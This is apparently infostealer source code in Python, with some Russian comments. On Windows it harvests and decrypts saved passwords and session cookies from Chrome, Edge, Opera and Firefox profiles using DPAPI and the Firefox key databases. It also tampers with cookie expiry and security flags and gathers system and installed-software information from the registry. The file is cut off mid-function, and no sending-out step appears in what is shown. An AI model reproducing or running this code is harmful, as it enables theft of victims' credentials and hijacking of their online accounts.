import os
import io
import sys
import hmac
import json
import winreg
import shutil
import base64
import zipfile
import sqlite3
import win32crypt
from pathlib import Path
from struct import unpack
from random import randint
from base64 import b64decode
from sqlite3 import ProgrammingError
from Crypto.Cipher import AES, DES3
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
from Crypto.Util.Padding import unpad
from binascii import hexlify, unhexlify
from datetime import datetime, timedelta, timezone
from Crypto.Util.number import long_to_bytes


connect = None
cursor = None
circle = 0
profile = 1

# Buffer Cookies
buf_cookies_google = io.StringIO()
buf_cookies_google_2 = io.StringIO()
buf_cookies_opera = io.StringIO()
buf_cookies_microsoft = io.StringIO()
buf_cookies_firefox = io.StringIO()

# Buffer Passwords
buf_passwords_google = io.StringIO()
buf_passwords_opera = io.StringIO()
buf_passwords_microsoft = io.StringIO()
buf_passwords_firefox = io.StringIO()

# Buffer os info
buf_installed_software = io.StringIO()
buf_user_information = io.StringIO()
buf_installed_browsers = io.StringIO()


def current_dir_path() -> str:
    """
        (current_path)
        (current_files)
    """
    try:
        try:
            current_files: list = os.listdir(".")  # файлы в директории текущей
            current_path: str = os.getcwd()  # текущий путь
            return current_files, current_path
        except Exception as error:
            print('Exception current_dir_path(): ', error)
    except Exception as exc:
        print('Exception current_dir_path(): ', exc)


def change_directory(current_path: str = '', file: str = '', back: bool = False) -> None:
    """
        Change directory
    """
    try:
        try:
            if back:
                os.chdir('..')
            else:
                path: str = f'{current_path}\{file}'
                os.chdir(path)
        except Exception as error:
            print('Exception change_directory(): ', error)
            raise SystemExit(1)
    except Exception as exc:
        print('Exception change_directory(): ', exc)


def get_google_cookies(prof, file_path=None):
    try:
        connect = sqlite3.connect(f'{file_path}')  # Connect to database
        cursor = connect.cursor()
        try:
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')  # Run the query
            results = cursor.fetchall()  # Get the results
            # Decrypt the cookie blobs
            for host_key, name, value, encrypted_value in results:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                # Updating the database with decrypted values.
                cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,\
                                is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",
                            (decrypted_value, host_key, name))

            connect.commit()  # Save the changes
            cursor = connect.cursor()
        except Exception as e:  # Avoid crashes from exceptions if any occurs.
            print('Exception get_google_cookies(): ', e)
            pass
        finally:
            if cursor is not None:
                cursor.close()
            if connect is not None:
                connect.close()
    except Exception as exc:
        print('Exception get_google_cookies(): ', exc)


def decrypt_data(data, key):
    try:
        try:
            # get the initialization vector
            iv = data[3:15]
            data = data[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                # not supported
                return ""
    except Exception as exc:
        print('Exception decrypt_data(): ', exc)


def get_encryption_key(browser):
    try:
        local_state_path = ''
        if browser == 'Google':
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
        elif browser == 'Opera':
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Roaming", "Opera Software", "Opera Stable",
                                            "Local State")
        elif browser == 'Microsoft':
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Microsoft", "Edge",
                                            "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove 'DPAPI' str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as exc:
        print('Exception get_encryption_key(): ', exc)


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    try:
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    except Exception as exc:
        print('Exception get_chrome_datetime(): ', exc)


def decrypt_password(password, key):
    try:
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""
    except Exception as exc:
        print('Exception decrypt_password(): ', exc)


def read_cookie(prof, browser, file_path):
    if browser == 'Google':
        try:
            connect = sqlite3.connect(f'{file_path}')
            cursor = connect.cursor()
            try:
                cursor.execute("""
                        SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly
                        FROM cookies
                """)

                key = get_encryption_key(browser='Google')

                for host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly in cursor.fetchall():
                    if not value:
                        decrypted_value = decrypt_data(encrypted_value, key)
                    else:
                        # already decrypted
                        decrypted_value = value
                    cookie = f'{host_key}\t{"TRUE" if is_httponly == 1 else "FALSE"}\t{path}\t{"TRUE" if is_secure == 1 else "FALSE"}\t{expires_utc}\t{name}\t{decrypted_value}'
                    buf_cookies_google.write(cookie + '\n')
            except Exception as err:
                print('[-] Exception read_cookie: ', err)
            finally:
                if cursor is not None:
                    cursor.close()
                if connect is not None:
                    connect.close()
        except Exception as exc:
            print('Exception read_cookie() - Google: ', exc)
    elif browser == 'Microsoft':
        try:
            connect = sqlite3.connect(f'{file_path}')
            cursor = connect.cursor()
            try:
                cursor.execute("""
                        SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly
                        FROM cookies""")

                key = get_encryption_key(browser='Microsoft')

                for host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly in cursor.fetchall():
                    if not value:
                        decrypted_value = decrypt_data(encrypted_value, key)
                    else:
                        # already decrypted
                        decrypted_value = value
                    cookie = f'{host_key}\t{"TRUE" if is_httponly == 1 else "FALSE"}\t{path}\t{"TRUE" if is_secure == 1 else "FALSE"}\t{expires_utc}\t{name}\t{decrypted_value}'
                    buf_cookies_microsoft.write(cookie + '\n')
            except Exception as err:
                print('[-] Exception read_cookie: ', err)
            finally:
                if cursor is not None:
                    cursor.close()
                if connect is not None:
                    connect.close()
        except Exception as exc:
            print('Exception read_cookie() - Microsoft: ', exc)
    elif browser == 'Google_2':
        try:
            connect = sqlite3.connect(f'{file_path}')
            cursor = connect.cursor()
            try:
                cursor.execute("""
                        SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly
                        FROM cookies
                """)

                key = get_encryption_key(browser='Google')

                for host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly in cursor.fetchall():
                    if not value:
                        decrypted_value = decrypt_data(encrypted_value, key)
                    else:
                        # already decrypted
                        decrypted_value = value
                    cookie = f'{host_key}\t{"TRUE" if is_httponly == 1 else "FALSE"}\t{path}\t{"TRUE" if is_secure == 1 else "FALSE"}\t{expires_utc}\t{name}\t{decrypted_value}'
                    buf_cookies_google_2.write(cookie + '\n')
            except Exception as err:
                print('[-] Exception read_cookie: ', err)
            finally:
                if cursor is not None:
                    cursor.close()
                if connect is not None:
                    connect.close()
        except Exception as exc:
            print('Exception read_cookie() - Google_2: ', exc)


def get_passwords(prof, browser):
    if browser == 'Google':
        try:
            # get the AES key
            key = get_encryption_key(browser='Google')
            for element in range(0, 2):
                # local sqlite Chrome database path
                if element == 0:
                    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", f'{prof}', "Login Data For Account")
                else:
                    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", f'{prof}', "Login Data")
                # copy the file to another location
                # as the database will be locked if chrome is currently running
                filename = "ChromeData.db"
                shutil.copyfile(db_path, filename)
                # connect to the database
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                # `logins` table has the data we need
                cursor.execute(
                    "select origin_url, action_url, username_value, "
                    "password_value, date_created, date_last_used "
                    "from logins order by date_created"
                )
                # iterate over all rows
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    password = decrypt_password(row[3], key)
                    date_created = row[4]
                    date_last_used = row[5]

                    passwords = f"""
                    Origin URL: {origin_url}
                    Action URL: {action_url}
                    Username: {username}
                    Password: {password}
                    Creation date: {str(get_chrome_datetime(date_created))}
                    Last Used: {str(get_chrome_datetime(date_last_used))}
                    """
                    buf_passwords_google.write(passwords + '\n')
                    # with open(f'./result/Google/passwords.txt', 'a') as f:
                    #     passwords = f"""
                    #     Origin URL: {origin_url}
                    #     Action URL: {action_url}
                    #     Username: {username}
                    #     Password: {password}
                    #     Creation date: {str(get_chrome_datetime(date_created))}
                    #     Last Used: {str(get_chrome_datetime(date_last_used))}
                    #     """
                    #     f.write(passwords + '\n')
                cursor.close()
                db.close()
                try:
                    # try to remove the copied db file
                    os.remove(filename)
                except:
                    pass
        except Exception as exc:
            print('Exception get_passwords() - Google: ', exc)
    elif browser == 'Microsoft':
        try:
            # get the AES key
            key = get_encryption_key(browser='Microsoft')
            # local sqlite Chrome database path
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Microsoft", "Edge", "User Data", f'{prof}', "Login Data")
            # copy the file to another location
            # as the database will be locked if chrome is currently running
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            # connect to the database
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            # `logins` table has the data we need
            cursor.execute(
                "select origin_url, action_url, username_value, "
                "password_value, date_created, date_last_used "
                "from logins order by date_created"
            )
            # iterate over all rows
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                passwords = f"""
                Origin URL: {origin_url}
                Action URL: {action_url}
                Username: {username}
                Password: {password}
                Creation date: {str(get_chrome_datetime(date_created))}
                Last Used: {str(get_chrome_datetime(date_last_used))}
                """
                buf_passwords_microsoft.write(passwords + '\n')
            cursor.close()
            db.close()
            try:
                # try to remove the copied db file
                os.remove(filename)
            except:
                pass
        except Exception as exc:
            print('Exception get_passwords() - Microsoft: ', exc)


profiles = [
    'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5',
    'Profile 6', 'Profile 7', 'Profile 8', 'Profile 9', 'Profile 10'
]

login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data'


# GOOGLE
def google_st():
    try:
        # "Вытаскиваем все файлы cookies из аккаунтов Google Chrome"
        for profile in profiles:
            try:
                files = os.listdir(login_data)
                if profile in files:
                    login_data_2 = os.environ['localappdata'] + f'\\Google\\Chrome\\User Data\\{profile}\\Cookies'
                    # Заходим и читаем каждый файл Cookie
                    get_google_cookies(prof=profile, file_path=login_data_2)
                    # Чтение файлов cookie
                    read_cookie(prof=profile, browser='Google', file_path=login_data_2)
                    # Получение всех паролей
                    get_passwords(prof=profile, browser='Google')
            except Exception as err:
                print('[-] Exception google_st(): ', err)
    except Exception as exc:
        print('Exception google_st(): ', exc)


# GOOGLE_2
def google_st_2():
    try:
        # "Вытаскиваем все файлы cookies из аккаунтов Google Chrome"
        for profile in profiles:
            try:
                files = os.listdir(login_data)
                if profile in files:
                    login_data_2 = os.environ['localappdata'] + f'\\Google\\Chrome\\User Data\\{profile}\\Extension Cookies'
                    # Заходим и читаем каждый файл Cookie
                    get_google_cookies(prof=profile, file_path=login_data_2)
                    # Чтение файлов cookie
                    read_cookie(prof=profile, browser='Google_2', file_path=login_data_2)
                    # # Получение всех паролей
                    # get_passwords(prof=profile, browser='Google')
            except Exception as err:
                print('[-] Exception google_st_2(): ', err)
    except Exception as exc:
        print('Exception google_st_2(): ', exc)


# OPERA
def get_opera_cookies():
    try:
        login_data_2 = os.environ['APPDATA'] + f'\\Opera Software\\Opera Stable\\Cookies'
        if login_data_2:
            conn = sqlite3.connect(f'{login_data_2}')
            cursor = conn.cursor()
            cursor.execute(
                """SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies"""
            )

            key = get_encryption_key(browser='Opera')

            for host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly in cursor.fetchall():
                if not value:
                    decrypted_value = decrypt_data(encrypted_value, key)
                else:
                    # already decrypted
                    decrypted_value = value
                cookie = f'{host_key}\t{"TRUE" if is_httponly == 1 else "FALSE"}\t{path}\t{"TRUE" if is_secure == 1 else "FALSE"}\t{expires_utc}\t{name}\t{decrypted_value}'
                buf_cookies_opera.write(cookie + '\n')
                conn.close()
        else:
            return 'Opera not installed in this computer'
    except Exception as exc:
        print('Exception get_opera_passwords(): ', exc)


def get_opera_passwords():
    try:
        # get the AES key
        key = get_encryption_key(browser='Opera')
        # local sqlite Chrome database path
        db_path = os.path.join(os.environ["USERPROFILE"],
                            "AppData", "Roaming", "Opera Software", "Opera Stable",
                            "Login Data")
        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = "OperaData.db"
        shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute(
            "select origin_url, action_url, username_value, "
            "password_value, date_created, date_last_used "
            "from logins order by date_created"
        )
        # iterate over all rows
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            passwords = f"""
            Origin URL: {origin_url}
            Action URL: {action_url}
            Username: {username}
            Password: {password}
            Creation date: {str(get_chrome_datetime(date_created))}
            Last Used: {str(get_chrome_datetime(date_last_used))}
            """
            buf_passwords_opera.write(passwords)
        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass
    except Exception as exc:
        print('Exception get_opera_passwords(): ', exc)


def opera_st():
    try:
        get_opera_cookies()
        get_opera_passwords()
    except Exception as exc:
        print('Exception opera_st(): ', exc)


# MICROSOFT EDGE
def get_microsoft_cookies(prof, file_path):
    try:
        # connect = sqlite3.connect(f'./Cookies/Microsoft_Edge/{prof}/Cookies')  # Connect to database
        connect = sqlite3.connect(f'{file_path}')  # Connect to database
        cursor = connect.cursor()
        try:
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')  # Run the query
            results = cursor.fetchall()  # Get the results

            # Decrypt the cookie blobs
            for host_key, name, value, encrypted_value in results:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                # Updating the database with decrypted values.
                cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,\
                                is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",
                            (decrypted_value, host_key, name))

            connect.commit()  # Save the changes
            cursor = connect.cursor()
        except Exception as e:  # Avoid crashes from exceptions if any occurs.
            print('Exception get_google_cookies', e)
            pass
        finally:
            if cursor is not None:
                cursor.close()
            if connect is not None:
                connect.close()
    except Exception as exc:
        print('Exception get_microsoft_cookies(): ', exc)


microsoft_login_data = os.environ['localappdata'] + '\\Microsoft\\Edge\\User Data'


def microsoft_st():
    try:
        for profile in profiles:
            try:
                files = os.listdir(microsoft_login_data)
                if profile in files:
                    login_data_2 = os.environ['localappdata'] + f'\\Microsoft\\Edge\\User Data\\{profile}\\Cookies'
                    # Заходим и читаем каждый файл Cookie
                    get_microsoft_cookies(prof=profile, file_path=login_data_2)
                    # Чтение файлов cookie
                    read_cookie(prof=profile, browser='Microsoft', file_path=login_data_2)
                    # Получение всех паролей
                    get_passwords(prof=profile, browser='Microsoft')
            except Exception as err:
                print('[-] Exception microsoft_st(): ', err)
    except Exception as exc:
        print('Exception microsoft_st(): ', exc)

# FIREFOX
def getShortLE(d, a):
    try:
        return unpack('<H', (d)[a:a + 2])[0]
    except Exception as exc:
        print('Exception getShortLE(): ', exc)


def getLongBE(d, a):
    try:
        return unpack('>L', (d)[a:a + 4])[0]
    except Exception as exc:
        print('Exception getLongBE(): ', exc)


# minimal 'ASN1 to string' function for displaying Key3.db and key4.db contents
asn1Types = {0x30: 'SEQUENCE', 4: 'OCTETSTRING', 6: 'OBJECTIDENTIFIER', 2: 'INTEGER', 5: 'NULL'}
# http://oid-info.com/get/1.2.840.113549.2.9
oidValues = {b'2a864886f70d010c050103': '1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC',
             b'2a864886f70d0307': '1.2.840.113549.3.7 des-ede3-cbc',
             b'2a864886f70d010101': '1.2.840.113549.1.1.1 pkcs-1',
             b'2a864886f70d01050d': '1.2.840.113549.1.5.13 pkcs5 pbes2',
             b'2a864886f70d01050c': '1.2.840.113549.1.5.12 pkcs5 PBKDF2',
             b'2a864886f70d0209': '1.2.840.113549.2.9 hmacWithSHA256',
             b'60864801650304012a': '2.16.840.1.101.3.4.1.42 aes256-CBC'
             }


def printASN1(d, l, rl):
    try:
        type = d[0]
        length = d[1]
        if length & 0x80 > 0:  # http://luca.ntop.org/Teaching/Appunti/asn1.html,
            nByteLength = length & 0x7f
            length = d[2]
            # Long form. Two to 127 octets. Bit 8 of first octet has value "1" and bits 7-1 give the number of additional length octets.
            skip = 1
        else:
            skip = 0
        print('  ' * rl, asn1Types[type], end=' ')
        if type == 0x30:
            print('{')
            seqLen = length
            readLen = 0
            while seqLen > 0:
                len2 = printASN1(d[2 + skip + readLen:], seqLen, rl + 1)
                seqLen = seqLen - len2
                readLen = readLen + len2
            print('  ' * rl, '}')
            return length + 2
        elif type == 6:  # OID
            oidVal = hexlify(d[2:2 + length])
            if oidVal in oidValues:
                print(oidValues[hexlify(d[2:2 + length])])
            else:
                print('oid? ', oidVal)
            return length + 2
        elif type == 4:  # OCTETSTRING
            return length + 2
        elif type == 5:  # NULL
            return length + 2
        elif type == 2:  # INTEGER
            return length + 2
        else:
            if length == l - 2:
                return length
            # extract records from a BSD DB 1.85, hash mode
    except Exception as exc:
        print('Exception printASN1(): ', exc)

# obsolete with Firefox 58.0.2 and NSS 3.35, as key4.db (SQLite) is used
def readBsddb(name):
    try:
        f = open(name, 'rb')
        # http://download.oracle.com/berkeley-db/db.1.85.tar.gz
        header = f.read(4 * 15)
        magic = getLongBE(header, 0)
        if magic != 0x61561:
            sys.exit()
        version = getLongBE(header, 4)
        if version != 2:
            sys.exit()
        pagesize = getLongBE(header, 12)
        nkeys = getLongBE(header, 0x38)

        readkeys = 0
        page = 1
        nval = 0
        val = 1
        db1 = []
        while (readkeys < nkeys):
            f.seek(pagesize * page)
            offsets = f.read((nkeys + 1) * 4 + 2)
            offsetVals = []
            i = 0
            nval = 0
            val = 1
            keys = 0
            while nval != val:
                keys += 1
                key = getShortLE(offsets, 2 + i)
                val = getShortLE(offsets, 4 + i)
                nval = getShortLE(offsets, 8 + i)
                offsetVals.append(key + pagesize * page)
                offsetVals.append(val + pagesize * page)
                readkeys += 1
                i += 4
            offsetVals.append(pagesize * (page + 1))
            valKey = sorted(offsetVals)
            for i in range(keys * 2):
                f.seek(valKey[i])
                data = f.read(valKey[i + 1] - valKey[i])
                db1.append(data)
            page += 1
        f.close()
        db = {}

        for i in range(0, len(db1), 2):
            db[db1[i + 1]] = db1[i]
        return db
    except Exception as exc:
        print('Exception readBsddb(): ', exc)

def decryptMoz3DES(globalSalt, masterPassword, entrySalt, encryptedData):
    try:
        # see http://www.drh-consultancy.demon.co.uk/key3.html
        hp = sha1(globalSalt + masterPassword).digest()
        pes = entrySalt + b'\x00' * (20 - len(entrySalt))
        chp = sha1(hp + entrySalt).digest()
        k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
        k = k1 + k2
        iv = k[-8:]
        key = k[:24]
        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)
    except Exception as exc:
        print('Exception decodeLoginData(): ', exc)


def decodeLoginData(data):
    try:
        asn1data = decoder.decode(b64decode(data))  # first base64 decoding, then ASN1DERdecode
        key_id = asn1data[0][0].asOctets()
        iv = asn1data[0][1][1].asOctets()
        ciphertext = asn1data[0][2].asOctets()
        return key_id, iv, ciphertext
    except Exception as exc:
        print('Exception decodeLoginData(): ', exc)


def getLoginData(path):
    try:
        logins = []
        sqlite_file = path / 'signons.sqlite'
        json_file = path / 'logins.json'
        if json_file.exists():  # since Firefox 32, json is used instead of sqlite3
            loginf = open(json_file, 'r').read()
            jsonLogins = json.loads(loginf)
            if 'logins' not in jsonLogins:
                print('error: no \'logins\' key in logins.json')
                return []
            for row in jsonLogins['logins']:
                encUsername = row['encryptedUsername']
                encPassword = row['encryptedPassword']
                logins.append((decodeLoginData(encUsername), decodeLoginData(encPassword), row['hostname']))
            return logins
        elif sqlite_file.exists():  # firefox < 32
            conn = sqlite3.connect(sqlite_file)
            c = conn.cursor()
            c.execute("SELECT * FROM moz_logins;")
            for row in c:
                encUsername = row[6]
                encPassword = row[7]
                logins.append((decodeLoginData(encUsername), decodeLoginData(encPassword), row[1]))
            return logins
        else:
            print('missing logins.json or signons.sqlite')
    except Exception as exc:
        print('Exception getLoginData(): ', exc)


CKA_ID = unhexlify('f8000000000000000000000000000001')


def extractSecretKey(masterPassword, keyData):  # 3DES
    try:
        # see http://www.drh-consultancy.demon.co.uk/key3.html
        pwdCheck = keyData[b'password-check']
        entrySaltLen = pwdCheck[1]
        entrySalt = pwdCheck[3: 3 + entrySaltLen]
        encryptedPasswd = pwdCheck[-16:]
        globalSalt = keyData[b'global-salt']
        cleartextData = decryptMoz3DES(globalSalt, masterPassword, entrySalt, encryptedPasswd)
        if cleartextData != b'password-check\x02\x02':
            print('password check error, Master Password is certainly used, please provide it with -p option')
            sys.exit()

        if CKA_ID not in keyData:
            return None
        privKeyEntry = keyData[CKA_ID]
        saltLen = privKeyEntry[1]
        nameLen = privKeyEntry[2]
        privKeyEntryASN1 = decoder.decode(privKeyEntry[3 + saltLen + nameLen:])
        # see https://github.com/philsmd/pswRecovery4Moz/blob/master/pswRecovery4Moz.txt
        entrySalt = privKeyEntryASN1[0][0][1][0].asOctets()
        privKeyData = privKeyEntryASN1[0][1].asOctets()
        privKey = decryptMoz3DES(globalSalt, masterPassword, entrySalt, privKeyData)
        privKeyASN1 = decoder.decode(privKey)
        prKey = privKeyASN1[0][2].asOctets()
        prKeyASN1 = decoder.decode(prKey)
        id = prKeyASN1[0][1]
        key = long_to_bytes(prKeyASN1[0][3])
        return key
    except Exception as exc:
        print('Exception extractSecretKey(): ', exc)


def decryptPBE(decodedItem, masterPassword, globalSalt):
    try:
        pbeAlgo = str(decodedItem[0][0][0])
        if pbeAlgo == '1.2.840.113549.1.12.5.1.3':  # pbeWithSha1AndTripleDES-CBC
            entrySalt = decodedItem[0][0][1][0].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            key = decryptMoz3DES(globalSalt, masterPassword, entrySalt, cipherT)
            return key[:24], pbeAlgo
        elif pbeAlgo == '1.2.840.113549.1.5.13':  # pkcs5 pbes2
            # https://phabricator.services.mozilla.com/rNSSfc636973ad06392d11597620b602779b4af312f6
            assert str(decodedItem[0][0][1][0][0]) == '1.2.840.113549.1.5.12'
            assert str(decodedItem[0][0][1][0][1][3][0]) == '1.2.840.113549.2.9'
            assert str(decodedItem[0][0][1][1][0]) == '2.16.840.1.101.3.4.1.42'
            # https://tools.ietf.org/html/rfc8018#page-23
            entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
            iterationCount = int(decodedItem[0][0][1][0][1][1])
            keyLength = int(decodedItem[0][0][1][0][1][2])
            assert keyLength == 32

            k = sha1(globalSalt + masterPassword).digest()
            key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)

            iv = b'\x04\x0e' + decodedItem[0][0][1][1][
                1].asOctets()  # https://hg.mozilla.org/projects/nss/rev/fc636973ad06392d11597620b602779b4af312f6#l6.49
            # 04 is OCTETSTRING, 0x0e is length == 14
            cipherT = decodedItem[0][1].asOctets()
            clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)

            return clearText, pbeAlgo
    except Exception as exc:
        print('Exception decryptPBE(): ', exc)


def getKey(masterPassword, directory):
    try:
        if (directory / 'key4.db').exists():
            conn = sqlite3.connect(directory / 'key4.db')  # firefox 58.0.2 / NSS 3.35 with key4.db in SQLite
            c = conn.cursor()
            # first check password
            c.execute("SELECT item1,item2 FROM metadata WHERE id = 'password';")
            row = c.fetchone()
            globalSalt = row[0]  # item1
            item2 = row[1]
            decodedItem2 = decoder.decode(item2)
            clearText, algo = decryptPBE(decodedItem2, masterPassword, globalSalt)

            if clearText == b'password-check\x02\x02':
                c.execute("SELECT a11,a102 FROM nssPrivate;")
                for row in c:
                    if row[0] != None:
                        break
                a11 = row[0]  # CKA_VALUE
                a102 = row[1]
                if a102 == CKA_ID:
                    decoded_a11 = decoder.decode(a11)
                    # decrypt master key
                    clearText, algo = decryptPBE(decoded_a11, masterPassword, globalSalt)
                    return clearText[:24], algo
            return None, None
        elif (directory / 'key3.db').exists():
            keyData = readBsddb(directory / 'key3.db')
            key = extractSecretKey(masterPassword, keyData)
            return key, '1.2.840.113549.1.12.5.1.3'
        else:
            print('cannot find key4.db or key3.db')
            return None, None
    except Exception as exc:
        print('Exception getKey(): ', exc)


curr_files, curr_path = current_dir_path()


def firefox_st():
    num_profile = 1
    # Копирование файла с cookies в файл со скриптом
    try:
        if os.path.exists(os.getenv('localappdata') + '\Mozilla\Firefox\Profiles'):
            login_data = os.environ['APPDATA']
            profiles = os.listdir(login_data + '\Mozilla\Firefox\Profiles')
            for profile in profiles:
                acc_path = f'{login_data}\Mozilla\Firefox\Profiles\{profile}'
                prof = os.listdir(acc_path)
                if len(prof) > 2:
                    if 'cookies.sqlite' in prof:
                        login_data_2 = acc_path + '\cookies.sqlite'

                    # Запуск sqlite3
                    connect = sqlite3.connect(f"{login_data_2}")
                    cursor = connect.cursor()
                    results = cursor.fetchall()
                    cursor.execute('SELECT host, isSecure, isHttpOnly, path, expiry, name, value FROM moz_cookies')
                    all_results = cursor.fetchall()

                    for cookie in all_results:
                        domain = cookie[0]
                        secure = cookie[1]
                        is_onlyhttp = cookie[2]
                        path = cookie[3]
                        expires = cookie[4]
                        name = cookie[5]
                        value = cookie[6]
                        cookie = f'{domain}\t{"TRUE" if is_onlyhttp == 1 else "FALSE"}\t{path}\t{"TRUE" if secure == 1 else "FALSE"}\t{expires}\t{name}\t{value}'
                        buf_cookies_firefox.write(cookie + '\n')

                    # Запуск скрипта для сбора паролей
                    my_acc_path = Path(acc_path)
                    key, algo = getKey(''.encode(), my_acc_path)
                    if key == None:
                        sys.exit()
                    logins = getLoginData(my_acc_path)
                    if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':
                        for i in logins:
                            assert i[0][0] == CKA_ID
                            iv = i[0][1]
                            ciphertext = i[0][2]
                            username_acc = unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8)
                            iv = i[1][1]
                            ciphertext = i[1][2]
                            password_acc = unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8)
                            url = i[2]
                            username = username_acc.decode('utf-8')
                            password = password_acc.decode('utf-8')
                            # Запуск скрипта для сбора паролей
                            password = f"Origin URL: {url}\nUsername: {username}\nPassword: {password}\n"
                            buf_passwords_firefox.write(password + '\n')
                    num_profile += 1
    except ProgrammingError as err:
        if cursor is not None:
            cursor.close()
        if connect is not None:
            connect.close()
        print('[-] Exception firefox_st(): ', err)
    finally:
        connect.close()
        cursor.close()


# Запуск скрипта
try:
    google_exist = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google")
    if os.path.isdir(google_exist):
        google_st()  # Google
    else:
        pass
except Exception as exc:
    print('Google: ', exc)


# Запуск скрипта
try:
    google_exist = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google")
    if os.path.isdir(google_exist):
        google_st_2()  # Google
    else:
        pass
except Exception as exc:
    print('Google: ', exc)


try:
    # Проверка на существования браузера на ПК
    opera_exist = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software")
    if os.path.isdir(opera_exist):
        opera_st()  # Opera
    else:
        pass
except Exception as exc:
    print('Opera: ', exc)

try:
    microsoft_exist = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge")
    if os.path.isdir(microsoft_exist):
        microsoft_st()  # Microsoft_Edge
    else:
        pass
except Exception as exc:
    print('Microsoft_Edge: ', exc)

try:
    firefox_exist = os.getenv('localappdata') + '\Mozilla'
    if os.path.isdir(firefox_exist):
        firefox_st()  # Firefox
    else:
        pass
except Exception as exc:
    print('Firefox: ', exc)


# OS INFO
def check_operative():
    try:
        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0,
            winreg.KEY_READ
        )

        if Hkey:
            read_value = winreg.QueryValueEx(
                Hkey,
                "ProductName"
            )[0]

            if read_value:
                return read_value
    except Exception as exc:
        print('Exception check_operative(): ', exc)


def show_programs(path, path_four):
    try:
        Hkey = winreg.OpenKeyEx(
            winreg.HKEY_LOCAL_MACHINE,
            path,
            0,
            winreg.KEY_READ
        )

        if Hkey:
            subkeys = winreg.QueryInfoKey(Hkey)[0]
            if subkeys > 0:
                arr_normal_name = []
                arr_normal_version = []
                for i in range(0, subkeys):

